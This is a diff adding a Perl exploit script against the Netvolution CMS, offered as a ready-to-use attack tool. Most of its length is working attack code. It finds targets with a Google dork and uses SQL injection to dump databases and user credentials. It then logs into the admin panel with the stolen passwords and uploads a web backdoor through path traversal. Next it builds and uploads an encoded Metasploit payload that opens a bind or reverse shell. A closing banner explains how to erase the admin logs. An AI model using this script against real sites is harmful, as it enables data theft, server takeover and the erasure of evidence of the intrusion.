@@ -1,0 +1,598 @@
+#!/usr/bin/perl
+
+#########################################################################################
+#											#
+# Exploit Title: Netvolution exploit script for CMS Version >= 2.xx.xx.xx		#
+# Date: 10/6/2010				  					#
+# Sotware Link: www.netvolution.net							#
+# Bug found : amquen, krumel								#
+# Exploited by: krumel									# 
+# Exploit Coded: mr.pr0n								#
+#                                     							#
+# Many thanks to icesurfer (author of SQLNINJA) and all p0wnbox members.		#
+# I have contact www.atcom.gr no response yet, although it seems that they have patch   #
+# partially the software.								#
+#########################################################################################
+#											#
+# This program is free software; you can redistribute it and/or				#
+# modify it under the terms of the GNU General Public License				#
+# as published by the Free Software Foundation; either version 2			#
+# of the License, or (at your option) any later version.				#
+# 											#
+# This program is distributed in the hope that it will be useful,			#
+# but WITHOUT ANY WARRANTY; without even the implied warranty of			#
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the				#
+# GNU General Public License for more details.						#
+#											# 
+# You should have received a copy of the GNU General Public License			#
+# along with this program; if not, write to the Free Software				#
+# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.		#
+#											#
+#########################################################################################
+
+#Using some modules!
+use LWP::UserAgent;
+use IO::Socket;
+use IO::Handle;
+
+print "\e[1;31m  _   _      _              _       _   _                                _       _ _ 			\e[0m\n";    
+print "\e[1;31m | \\ | |    | |            | |     | | (_)                              | |     (_) | 			\e[0m\n";  
+print "\e[1;31m |  \\| | ___| |___   _____ | |_   _| |_ _  ___  _ __      _____  ___ __ | | ___  _| |_ 		        \e[0m\n"; 
+print "\e[1;31m | . ` |/ _ \\ __\\ \\ / / _ \\| | | | | __| |/ _ \\| '_ \\    / _ \\ \\/ / '_ \\| |/ _ \\| | __|	\e[0m\n";
+print "\e[1;31m | |\\  |  __/ |_ \\ V / (_) | | |_| | |_| | (_) | | | |  |  __/>  <| |_) | | (_) | | |_  		\e[0m\n";
+print "\e[1;31m |_| \\_|\\___|\\__| \\_/ \\___/|_|\\__,_|\\__|_|\\___/|_| |_|   \\___/_/\\_\\ .__/|_|\\___/|_|\\__|	\e[0m\n";
+print "\e[1;31m                                                                  | |                  			\e[0m\n";               
+print "\e[1;31m                                                                  |_|  ...for CMS Version >= 2.xx.xx.xx 	\e[0m\n";
+
+# ************* #
+# Target dork.   
+# ************* #
+print "\nGoogle Dork:";
+print "\n\e[1;45mallinurl: 'default.asp?pid'\e[0m\n";
+
+# ************ #
+# Main Menu.
+# ************ #
+menu:;
+
+print "\n[*] Main Menu:\n";
+print "    1. Automated list site scan for injection.\n";
+print "    2. Export all Infomation_Schema Tables and Columns.\n";
+print "    3. Find all Databases.\n";
+print "    4. Export all usernames and passwords of the 'cms_Users' table.\n";
+print "    5. Manuall exploitation.\n";
+print "    6. Compatibility with the Metasploit Framework.\n";
+print "    7. Exit.\n";
+
+print "> ";
+$option=<STDIN>;
+print "\n";
+if ($option!=1 && $option!=2 && $option!=3 && $option!=4 && $option!=5 && $option!=6 && $option!=7) 
+{
+print "\e[1;31mWrong Option!!\e[0m\n";
+goto menu;
+}
+# Select Option.
+if ($option==1)
+{&site_scan} # Automated list site scan for injection.
+if ($option==2)
+{&info_schema_tables_and_columns}# Export all Infomation_Schema Tables and Columns.
+if ($option==3)
+{&extract_db}# Find all Databases.
+if ($option==4)
+{&automated_exploitation}# Export all usernames and passwords of the 'cms_Users'table.
+if ($option==5)
+{&manually}# Manuall exploitation.
+if ($option==6)
+{&metasploit}# Compatibility with Metasploit Project (Under construction).
+if ($option==7)
+{&quit}# Quit it!
+
+# ******************************************* #
+# Automated list site scan for injection.
+# ******************************************* #
+sub site_scan
+{
+$sites= "/Users/pentest/Desktop/sites.txt"; ########  ***[E_D_I_T  H_E_R_E]***  ##############
+$scan = "10+and+1=convert(int,db_name(1))";
+
+# Counter
+$i = 1;
+print " [*]Opening site list... \n";
+open (SITELIST, $sites);
+print " [*]Sitelist opened successfully!\n";
+print " [*]Scanning...\n";
+@sitelist = <SITELIST>;
+   print " [*]Results:\n";
+   for ($i; $i <= @sitelist; $i++)
+   {  
+       $host = $sitelist[$i]; 
+       chop ($host);  
+       $int = LWP::UserAgent->new() or die;
+       $check=$int->get($host.$scan);   
+          if ($check->content =~ m/value '(.*)' to/g)
+          {
+	    print "\e[1;36m$host\e[0m\n";
+          }
+    }
+goto menu;
+}
+
+# ********************************************************** #
+# Exploiting *all* the Infomation_Schema Tables and Columns.  
+# ********************************************************** #
+sub info_schema_tables_and_columns
+{
+# ***************#
+# Table Counter 
+# ***************#
+print "Enter your Target (e.g.: http://www.target.gr/default.asp?pid=73&artID=)\n";
+print "> ";
+$atcom=<STDIN>;
+print "Enter the range scanning of Tables (e.g.: 15): \n";
+print "> ";
+$endt =<STDIN>;
+
+# Counter
+$countt = 1;
+print "\n [*] Exloiting Information_Schema Tables...\n";
+    $infoschema_t = "10+and+1=convert(int,(se%l%e%c%t%20top%20%201%20table_name%20from%20Information_Schema.tables))";
+    $int = LWP::UserAgent->new() or die;
+    $check=$int->get($atcom.$infoschema_t);
+    if ($check->content =~ m/value '(.*)' to/g)
+    {
+       ($first_t) = $1;
+        print "\e[1;33m$first_t\e[0m\n";
+           @chars_t = split(//, "$first_t");
+           $got_t = join("%", @chars_t);
+           $first_t = "%27$got_t%27";
+           for ($countt; $countt <= $endt; $countt++) 
+           {
+           $fullsqli_t = "10+and+1=convert(int,(se%l%e%c%t%20top%20%201%20table_name%20from%20Information_Schema.tables%20where%20table_name%20not%20in($first_t)))";
+       	   $int = LWP::UserAgent->new() or die;
+           $check=$int->get($atcom.$fullsqli_t);
+           if ($check->content =~ m/value '(.*)' to/g)
+           {
+             ($next_t) = $1;
+             print "\e[1;33m$next_t\e[0m\n";
+	     @chars_t = split(//, "$next_t");
+             $got_t = join("%", @chars_t);
+             $next_t = $got_t ;
+             $first_t = $first_t.",%27".$next_t."%27";
+           }
+       }
+     }
+      else 
+          {
+	  print "\e[1;31mFAILED!\e[0m\n";
+          }
+# ***************#
+# Column Counter 
+# ***************#
+print "Enter the range of scanning Columns (e.g.: 20)\n";
+print "> ";
+$endc =<STDIN>;
+
+# Counter
+$countc = 1;
+print "[*] Exloiting Information_Schema Column...\n";
+   $infoschema_c = "10+and+1=convert(int,(se%l%e%c%t%20top%20%201%20column_name%20from%20Information_Schema.columns))";    
+   $int = LWP::UserAgent->new() or die;
+   $check=$int->get($atcom.$infoschema_c);  
+       if ($check->content =~ m/value '(.*)' to/g)
+        {
+          ($first_c) = $1;
+          print "\e[1;33m$first_c\e[0m\n";
+          @chars_c = split(//, "$first_c");
+          $got_c = join("%", @chars_c);
+          $first_c = "%27$got_c%27";
+         for ($countc; $countc <= $endc; $countc++)
+         {
+           $fullsqli_c = "10+and+1=convert(int,(se%l%e%c%t%20top%20%201%20column_name%20from%20Information_Schema.columns%20where%20column_name%20not%20in($first_c)))";
+           $int = LWP::UserAgent->new() or die;
+           $check=$int->get($atcom.$fullsqli_c);
+           if ($check->content =~ m/value '(.*)' to/g)
+           {
+            ($next_c) = $1;
+            print "\e[1;33m$next_c\e[0m\n";
+	    @chars_c = split(//, "$next_c");
+            $got_c = join("%", @chars_c);
+            $next_c = $got_c ;
+            $first_c = $first_c.",%27".$next_c."%27";
+          }
+         }
+       }
+      else 
+         {
+         print "\e[1;31mFAILED!\e[0m";
+         }
+goto menu;
+}
+
+# *************************************** #
+# Exploiting *all* the inside Databases. 
+# *************************************** #
+sub extract_db
+{
+print "Enter your Target (e.g.: http://www.target.gr/default.asp?pid=73&artID=)\n";
+print "> ";
+$atcom=<STDIN>;
+print "Enter the range of scanning Databases (e.g.: 30)\n";
+print "> ";
+$enddb =<STDIN>;
+# Counter
+$countdb = 1;
+print "[*] Exloiting the inside Databases....\n";
+for ($countdb; $countdb <= $enddb; $countdb++)
+{ 
+    $db = "10+and+1=convert(int,db_name($countdb))";
+    $int = LWP::UserAgent->new() or die;
+    $check=$int->get($atcom.$db);  
+    if ($check->content =~ m/value '(.*)' to/g)
+       {
+        ($database) = $1;
+         print "[ID:$countdb]","\e[1;35m$database\e[0m\n";
+       }
+       else 
+          {
+	   print "\e[1;31mFAILED!\e[0m\n";
+          }
+}
+goto menu;
+}
+
+# ***************************************************************** #
+# Exploiting *all* usernames and passwords of the table "cms_Users" 
+# ***************************************************************** #
+sub automated_exploitation
+{
+print "Enter your Target (e.g.: http://www.target.gr/default.asp?pid=73&artID=)\n";
+print "> ";
+$atcom=<STDIN>;
+print "Enter the range of scanning userID (e.g.: 20)\n";
+print "> ";
+$end =<STDIN>;
+# Counter
+$count = 1;
+print "[*] Exloiting Usernames and Passwords...\n";
+for ($count; $count <= $end; $count++)
+{ 
+$useremail = "10+and+1=convert(int,(se%l%e%c%t(substring(useremail,1,1000))%20from%20cms_Users%20where%20userID=$count%29%29";
+$userpassword = "10+and+1=convert(int,(se%l%e%c%t%20(substring(userpassword,1,10000))%20from%20cms_Users%20where%20userID=$count%29%29";
+    $int = LWP::UserAgent->new() or die;
+    $check=$int->get($atcom.$useremail);   
+    if ($check->content =~ m/value '(.*)' to/g)
+    {
+       ($email) = $1;
+       print "[ID:$count]"," \e[1;32m$email\e[0m";
+       $gotmail = $email; # Usage for the section of Metasploit Framework.
+       $int = LWP::UserAgent->new() or die;
+       $check=$int->get($atcom.$userpassword);
+         if ($check->content =~ m/value '(.*)' to/g){
+         ($pass) = $1;
+         print " : \e[1;32m$pass\e[0m\n";
+         $gotpass = $pass; # Usage for the section of Metasploit Framework.
+         }
+         else 
+            {
+            print " : \e[1;31m-\e[0m\n";
+            }}
+     else 
+        {
+        print "[ID:$count","] \e[1;31m-\e[0m : \e[1;31m-\e[0m\n";
+        }
+}
+goto menu;
+}
+
+# **************************************** #
+# Exploiting Columns and Tables manually.
+# **************************************** #
+sub manually
+{
+print "Enter your Target (e.g.: http://www.target.gr/default.asp?pid=73&artID=)\n";
+print "> ";
+$atcom=<STDIN>;
+print "Enter the name of your target's Table (e.g.: cms_Users)\n";
+print "> ";
+$table =<STDIN>;
+print "Enter your the name of your target's Column (e.g.: userpassword)\n";
+print "> ";
+$column =<STDIN>;
+print "Enter the range of scanning (e.g.: 10)\n";
+print "> ";
+$endm =<STDIN>;
+
+$countm = 1;
+print "[*] Manuall Exploitation...\n";
+for ($countm; $countm <= $endm; $countm++)
+{ 
+$manually = "10+and+1=convert(int,(se%l%e%c%t(substring($column,1,1000))%20from%20$table%20where%20userID=$countm%29%29";
+    $int = LWP::UserAgent->new() or die;
+    $check=$int->get($atcom.$manually);   
+    if ($check->content =~ m/value '(.*)' to/g){
+       ($got) = $1;
+       print "[ID:$countm]"," \e[1;32m$got\e[0m\n";
+       }
+       else 
+          {
+          print "[ID:$countm","] \e[1;31m-\e[0m : \e[1;31m-\e[0m\n";
+          }
+  }
+goto menu;
+}
+
+# ***************************************************************** #
+# Compatibility with the Metasploit Framework.
+# ***************************************************************** #
+sub metasploit
+{
+if (($gotmail eq "") or ($gotpass eq ""))
+{
+print "Enter your Target (e.g.: http://www.target.gr/default.asp?pid=73&artID=)\n";
+print "> ";
+$atcom=<STDIN>;
+$end = 10;
+$count = 1;
+for ($count; $count < $end; $count++)
+{ 
+$useremail = "10+and+1=convert(int,(se%l%e%c%t(substring(useremail,1,1000))%20from%20cms_Users%20where%20userID=$count%29%29";
+$userpassword = "10+and+1=convert(int,(se%l%e%c%t%20(substring(userpassword,1,10000))%20from%20cms_Users%20where%20userID=$count%29%29";
+
+    $int = LWP::UserAgent->new() or die;
+    $check=$int->get($atcom.$useremail);   
+    if ($check->content =~ m/value '(.*)' to/g)
+    {
+       ($email) = $1;
+       $gotmail = $email;
+       $int = LWP::UserAgent->new() or die;
+       $check=$int->get($atcom.$userpassword);
+         if ($check->content =~ m/value '(.*)' to/g){
+         ($pass) = $1;
+         $gotpass = $pass;
+         $end = $count;
+         }}
+}
+}
+if ($atcom =~ m/www.(.*).gr/g){
+($site) = $1;
+}
+
+# Checking if the Metasploit Framework is already installed.
+print "[*] Looking for the Metasploit Framework... ";
+$msfcli = "";
+$msfpayload = "";
+if ($msfpath eq "") {
+	$path1 = $ENV{PATH};
+	@path = split(/:/,$path1);
+	foreach (@path) {
+		if (-e $_."/msfcli") {
+			$msfcli = $_."/msfcli";
+		} elsif (-e $_."/msfcli3") {
+			$msfcli = $_."/msfcli3";
+		}
+		if (-e $_."/msfpayload") {
+			$msfpayload = $_."/msfpayload";
+		} elsif (-e $_."/msfpayload3") {
+			$msfpayload = $_."/msfpayload3";
+		}
+	}
+} else {
+	if (-e $msfpath."/msfcli") {
+		$msfcli = $msfpath."msfcli";
+	} elsif (-e $msfpath."/msfcli3") {
+		$msfcli = $msfpath."msfcli3";
+	}
+	if (-e $msfpath."/msfpayload") {
+		$msfpayload = $msfpath."msfpayload";
+	} elsif (-e $msfpath."/msfpayload3") {
+		$msfpayload = $msfpath."msfpayload3";
+	}
+		
+	}
+
+if ($msfcli eq ""){
+        print "[\e[1;31m FAILED \e[0m]\n";
+	print "[-] msfcli not found\n";
+	exit(-1);
+        }
+
+if ($msfpayload eq "") {
+        print "[\e[1;32m FAILED \e[0m]\n";
+	print "[-] msfpayload not found\n";
+	exit(-1);
+        }
+print "[\e[1;32m DONE \e[0m]\n";
+
+#Retrieve Cookie
+system('curl -k -L -b cookies.txt -c cookies.txt -o step-1.html http://www.'.$site.'.gr/');
+system('curl -k -L -b cookies.txt -c cookies.txt  -d email='.$gotmail.' -d password='.$gotpass.' -o step-2.html http://www.'.$site.'.gr/admin/default.asp?ac=2');
+
+#Upload Web-Backdoor
+system('curl -k -L -b cookies.txt -c cookies.txt -F name=file1 -F filename=@cmdasp.aspx http://www.'.$site.'.gr/admin/tools/files/filesUpload.asp?folder=..%2F..%2F..%2Ffiles');
+
+# Choose your payload.
+print "Which payload you want to use?\n";
+print "    1. Meterpreter\n    2. VNC\n";
+
+while (($payload ne 1) and ($payload ne 2)) {
+	print "msf > ";
+	$payload = <STDIN>;
+	chomp($payload);
+        }
+
+if ($payload == 1) {
+	$payload = "meterpreter";
+        } else {
+	$payload = "vncinject";
+        }
+
+# Choose your connection.
+print "Which type of connection you want to use?\n";
+print "    1. bind_tcp\n    2. reverse_tcp\n";
+while (($conn ne "1") and ($conn ne "2")) {
+	print "msf > ";
+	$conn = <STDIN>;
+	chomp($conn);
+        }
+
+if ($conn == 1) {
+	$conn = "bind_tcp";
+        } else {
+	$conn = "reverse_tcp";
+        }
+
+if ($conn eq "bind_tcp"){
+	print "Enter your Remote host\n";
+	print "msf > ";
+	$rhost = <STDIN>;
+	chomp $rhost
+        } else {
+	print "Enter your Public IP\n";
+	print "msf > ";
+	$lhost = <STDIN>;
+	chomp $lhost ;
+        print "Enter your Local Host\n";
+	print "msf > ";
+	$lhost1 = <STDIN>;
+	chomp $lhost1 ;
+	}
+
+if ($conn eq "bind_tcp"){
+	print "Enter Remote port number\n";
+	} else {
+	print "Enter local port number\n";
+	}
+
+$port = 0;
+while (($port < 1) or ($port > 65535)){
+	print "msf > ";
+	$port = <STDIN>;
+	chomp($port);
+        }
+
+# Choose your Encryption.
+$enc = -1;
+print "[*] Choose a payload encoding method:\n".
+      "    0.  None\n".
+      "    1.  Alpha2 Alphanumeric Mixedcase\n".
+      "    2.  Alpha2 Alphanumeric Uppercase\n".
+      "    3.  Avoid UTF8/tolower\n".
+      "    4.  Call+4 Dword XOR\n".
+      "    5.  Single-byte XOR Countdown\n".
+      "    6.  Variable-length Fnstenv/mov Dword XOR\n".
+      "    7.  Polymorphic Jump/Call XOR Additive Feedback\n".
+      "    8.  Non-Alpha\n".
+      "    9.  Non-Upper\n".
+      "   10.  Polymorphic XOR Additive Feedback\n".
+      "   11.  Alpha2 Alphanumeric Unicode Mixedcase\n".
+      "   12.  Alpha2 Alphanumeric Unicode Uppercase\n";
+while (($enc < 0) or ($enc > 12)) 
+{
+	print "msf > ";
+	$enc = <STDIN>;
+	chomp($enc);
+}
+$encoder = " encoder=";
+for ($enc) 
+{
+	/^0$/ && do {$encoder = ""};
+	/^1$/ && do {$encoder .= "x86/alpha_mixed "};
+	/^2$/ && do {$encoder .= "x86/alpha_upper "};
+	/^3$/ && do {$encoder .= "x86/avoid_utf8_tolower "};
+	/^4$/ && do {$encoder .= "x86/call4_dword_xor "};
+	/^5$/ && do {$encoder .= "x86/countdown "};
+	/^6$/ && do {$encoder .= "x86/fnstenv_mov "};
+	/^7$/ && do {$encoder .= "x86/jmp_call_additive "};
+	/^8$/ && do {$encoder .= "x86/nonalpha "};
+	/^9$/ && do {$encoder .= "x86/nonupper "};
+	/^10$/ && do {$encoder .= "x86/shikata_ga_nai "};
+	/^11$/ && do {$encoder .= "x86/unicode_mixed "};
+	/^12$/ && do {$encoder .= "x86/unicode_upper "};
+}
+
+# Creation of the executable payload.
+$exe = "backup".int(rand()*010101);
+$command = $msfpayload." windows/".$payload."/".$conn.$encoder." exitfunc=process";
+
+if ($conn eq "bind_tcp") 
+{
+	$command .= " lport=".$port." X > /tmp/".$exe.".exe";
+	} else {
+		$command .= " lport=".$port." lhost=".$lhost." X "."> /tmp/".$exe.".exe";
+		}
+		if ($verbose == 1) 
+		{
+		print "[v] Command: ".$command."\n";
+		}
+		system ($command);
+		unless (-e "/tmp/".$exe.".exe") {
+		print "[-] Payload creation... [\e[1;31m FAILED \e[0m]\n";
+		exit(-1);
+}
+
+print "[*] Payload creation... [\e[1;32m DONE \e[0m]\n";
+print "[*] Payload (".$exe.".exe) created.\n";
+
+$xpl = '/tmp/'.$exe.'.exe';
+
+#Upload the executable file to the remote Webserver.
+system('curl -k -L -b cookies.txt -c cookies.txt -F name=file1 -F filename=@'.$xpl.' http://www.'.$site.'.gr/admin/tools/files/filesUpload.asp?folder=..%2F..%2F..%2Ffiles');
+
+$parameter = $exe.".exe";
+
+# The child handles the request to the target, the parent calls Metasploit Framework!
+$pid = fork();
+if ($pid eq 0) {
+sleep(1);
+exit(0);
+}
+
+# This is the parent.
+$syscommand = $msfcli." exploit/multi/handler "."PAYLOAD=windows/".$payload."/".$conn." ";
+if ($conn eq "bind_tcp")
+	{
+	$syscommand .= "LPORT=".$port." RHOST=".$rhost." E";
+	print "\e[1;34m$syscommand\e[0m\n";
+	} else {
+
+		$syscommand .= "LPORT=".$port." LHOST=".$lhost1." E";
+		print "\e[1;34m$syscommand\e[0m\n";
+		}
+#Execute msfcli
+print "Are you ready to execute msfcli? (Press Enter)\n";
+print "msf > ";
+$enter = <STDIN>;
+chomp($enter);
+print " Please Wait...";
+print "[*] Executing the msfcli... [\e[1;32m DONE \e[0m]\n";
+
+system("xterm -bg black -fg white -bd black -e ".$syscommand." &"); # If you don't have xterm, install IT!
+sleep(30); # Sleep 30 seconds to fire up Metasploit Framework!
+
+#Execute metasploit shell throught Web-Backdoor (cmdasp.aspx).
+system('curl -k -L -b /tmp/cookies.txt -c /tmp/cookies.txt  -d __VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZKAYI%2BuShUtjaEQHez7lnHYtwecj -d txtArg="C:\Inetpub\EventSites\enterpriseitsecurity.gr\files\\'.$parameter.'" -d testing=excute -d __EVENTVALIDATION=%2FwEWAwLw6bCOCgKa%2B%2BKPCgKBwth5tWrCE%2BPx6jReXWdJAVRgAZWRoxo%3D  http://www.'.$site.'.gr/files/cmdasp.aspx');
+}
+
+print "# ******************************************************************************#\n";
+print "# CAUTION 	CAUTION 	 CAUTION 	 CAUTION 	 CAUTION       *#\n";
+print "# ******************************************************************************#\n";
+print "# In Order to delete the logs go to  http://www.target.gr/files/cmdasp.aspx    *#\n";
+print "# and execute the following command :                                          *#\n";
+print "#									       *#\n";
+print "# sqlcmd -S target_IP -U Database_User -P Database_Password -d Target_Database *#\n";
+print "# -Q ''delete from cms_AdminLog where logRecDbTable='Your_Public_IP' '' -u     *#\n";
+print "#									       *#\n";
+print "# The Username and password for the Database can be found inside global.asa    *#\n";
+print "# ******************************************************************************#\n";
+
+
+# ***********#
+# Quitting :D
+# ***********#
+sub quit
+{
+print "\e[1;31mExiting...Bye-Bye!\e[0m\n";
+exit(1);
+}
+# ***************************************************************** #
